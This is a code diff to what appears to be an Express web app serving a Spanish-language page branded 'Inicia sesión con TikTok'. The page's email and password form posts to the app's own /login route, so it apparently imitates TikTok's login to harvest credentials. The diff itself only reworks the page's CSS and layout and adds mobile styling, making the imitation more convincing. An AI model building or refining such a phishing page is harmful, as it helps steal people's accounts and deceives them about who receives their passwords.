@@ -27,9 +27,6 @@ res.send(`
 <!DOCTYPE html>
 <html lang="es">
 
-<!DOCTYPE html>
-<html lang="es">
-
 <head>
 
 <meta charset="UTF-8">
@@ -78,13 +75,21 @@ body{
 .login-box h1{
     color:white;
 }
-.form-box h2{
-    color:white;
+.form-box{
+
+    width:420px;
     text-align:center;
-    margin-bottom:25px;
+
 }
 
+.form-box h2{
 
+    color:white;
+    margin-top:20px;
+    margin-bottom:25px;
+
+
+}
 .forgot{
     color:#aaa;
     text-align:right;
@@ -121,10 +126,9 @@ body{
 
     display:block;
 
-    margin:0 auto 25px;
+    margin:0 auto 15px;
 
 }
-
 
 
 .descripcion{
@@ -241,6 +245,23 @@ button:hover{
 .forgot:hover{
     color:white;
 }
+
+
+
+@media (max-width:768px){
+
+    .form-box{
+        width:90%;
+        margin:auto;
+        text-align:center;
+    }
+
+    .logo{
+        width:100px;
+        height:100px;
+    }
+
+}
 </style>
 
 
@@ -250,17 +271,14 @@ button:hover{
 <body>
 
 
-<div class="login-box">
+<div class="form-box">
 
 <img src="/icon.png" class="logo">
-<h1>TikTok</h1>
-
-</div>
-<div class="form-box">
 
 <h2>Inicia sesión con TikTok</h2>
 
 <form action="/login" method="POST">
+
 
 <input
 type="email"
@@ -287,6 +305,8 @@ required>
     ¿No tienes cuenta?
     <span>Crear cuenta</span>
 </p>
+
+</form>
 
 </div>
 
